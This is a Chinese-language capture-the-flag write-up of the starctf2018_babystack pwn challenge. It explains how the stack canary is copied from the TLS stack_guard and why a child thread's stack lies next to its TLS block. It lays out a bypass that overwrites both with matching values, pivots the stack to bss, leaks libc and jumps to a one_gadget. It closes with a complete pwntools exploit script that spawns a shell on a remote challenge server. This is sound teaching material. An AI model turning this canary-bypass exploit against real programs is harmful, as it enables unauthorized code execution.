+++
title = "wp2"
date = "2026-03-27"
type = "post"
categories = ['BUU']
tags = ['第六页', 'starctf2018_babystack']
draft = false
+++
[wp源地址](https://zikh26.github.io/posts/6967ee12.html)
## 总结

通过本题的学习与总结有：

1. 之前一直以为ret2libc必须得返回到原本的输入函数处，再次输入一次getshell。但有时候我们重新返回到原本的输入函数可能会出现一些问题，因此我们可以打一个栈迁移+rop执行read。就是先覆盖rbp为bss段上的地址，然后执行puts函数泄露libc，接着执行read函数往bss段上输入数据，最后执行leave ret完成栈迁移从而将执行流劫持到bss段上
    
2. 插入到栈里的canary是从TLS结构体中的stack_guard成员变量赋值过来的(而函数返回时，会将栈里的canary与TLS中的stack_guard做对比)。主线程中的TLS通常位于mmap映射出来的地址空间里，而位置也比较随机，覆盖的可能性不大；子线程中的TLS则位于线程栈的顶部(高地址处)，而这个子线程栈通常也是mmap映射出来的一段内存，这就给了我们栈溢出控制子线程中的TLS机会
    
3. TLS(Thread Local Storage) 线程局部存储。本身是一种机制，简单来说就是多个线程访问同一个全局变量或者静态变量可能会发生冲突，而这个机制类似于让每个线程都备份了一份全局变量或者静态变量，当前线程只能修改自己这份全局变量或者静态变量并不会影响其他线程的全局变量以及静态变量。
    
4. 在glibc实现中，TLS被指向一个segment register fs(x86-64上)，它的结构tcbhead_t定义如下：
```c
    
    |   |
    |---|
    |typedef struct  <br>{  <br>  void *tcb;        /* Pointer to the TCB.  Not necessarily the  <br>               thread descriptor used by libpthread.  */  <br>  dtv_t *dtv;  <br>  void *self;       /* Pointer to the thread descriptor.  */  <br>  int multiple_threads;  <br>  int gscope_flag;  <br>  uintptr_t sysinfo;  <br>  uintptr_t stack_guard;  <br>  uintptr_t pointer_guard;  <br>  ...  <br>} tcbhead_t;|
    
```
    而上面的stack_guard也就是放到栈里的canary，而在程序里看见的这行代码
    
    `xor rdx, fs:28h`中的fs寄存器也就指向了TLS这个结构体，而偏移0x28的位置正好是stack_guard,canary是来自于内核生成的一个随机数。
    
5. 最后要说一下这个子线程栈和父线程内存的关系。每个线程都会有自己单独的栈区，而子线程的栈区通常都是调用了mmap映射了一段内存。在父进程里我们依然可以看到这片内存，如下
![Pasted image 20260327190330.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260327190330.png)


在父线程中依然可以看到这片内存，并且发现是mmap映射出来的区域，如下，所以子线程的栈区只是对于自己是私有的，这并不意味着其他线程访问不了，如果能拿到相关指针，依然可以对其操作。

![Pasted image 20260327190344.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260327190344.png)
## [](https://zikh26.github.io/posts/6967ee12.html#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5 "保护策略")保护策略
![Pasted image 20260327190353.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260327190353.png)

## [](https://zikh26.github.io/posts/6967ee12.html#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90 "程序分析")程序分析

主函数就是开了一个子线程出来，然后子线程去执行了这个函数
![Pasted image 20260327190401.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260327190401.png)

而在子线程调用的这个函数，漏洞是很明显的栈溢出(如下)。特点是溢出的字节数很大。

![Pasted image 20260327190422.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260327190422.png)
## [](https://zikh26.github.io/posts/6967ee12.html#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF "利用思路")利用思路

本程序是在子线程里有一个很大的栈溢出漏洞，而子线程的栈是mmap映射出来的内存，并且TLS位于栈的顶部(高地址)，这道题的关键就是绕过canary保护。因为最后canary会和fs:0x28的值去比较，而fs就是TLS的首地址，0x28的位置就是stack_guard(canary就是拷贝的这个值放到的栈里)。因此我们在子线程里栈溢出去控制TLS里的stack_guard，让其和canary的值一样即可。

**如果想要在gdb中获取子线程TLS的首地址可以执行`x/x pthread_self()`来查看**。

剩下的思路就是先控制rbp为bss段地址，接着执行puts函数泄露libc地址，再控制执行流调用read函数，将one_gadget读入到bss段(因为执行system函数会出现一些错误),最后执行leave;ret将栈迁移到bss段，劫持执行流到刚才读入的one_gadget上。

## [](https://zikh26.github.io/posts/6967ee12.html#EXP "EXP")EXP
```python
from tools import *
context.arch='amd64'
context.log_level='debug'
p,e,libc=load("a","node4.buuoj.cn:29028","buu64-libc-2.27.so")
pop_rdi=0x0000000000400c03
pop_rsi_r15=0x0000000000400c01
leave_ret=0x0000000000400955
debug(p,0x400A7D)
p.sendlineafter("How many bytes do you want to send?",str(0x1850))
pause()
payload=b'a'*0x1008+p64(0xdeadbeef)#0xdeadbeef is canary
payload+=p64(0x602030-8+0x180)#rbp
payload+=p64(pop_rdi)+p64(e.got['puts'])+p64(e.plt['puts'])
payload+=p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(0x602030+0x180)+p64(0)+p64(e.plt['read'])+p64(leave_ret)
payload=payload.ljust(0x1848,b"a")
payload+=p64(0xdeadbeef)#TLS stack_guard
print(len(payload))
p.send(payload)
libc_base=recv_libc()-libc.symbols['puts']
sys_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base +next(libc.search(b"/bin/sh"))
log_addr('libc_base')
sleep(0.2)

p.send(p64(libc_base+search_og(1)))
p.interactive()

```
![Pasted image 20260327190646.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260327190646.png)
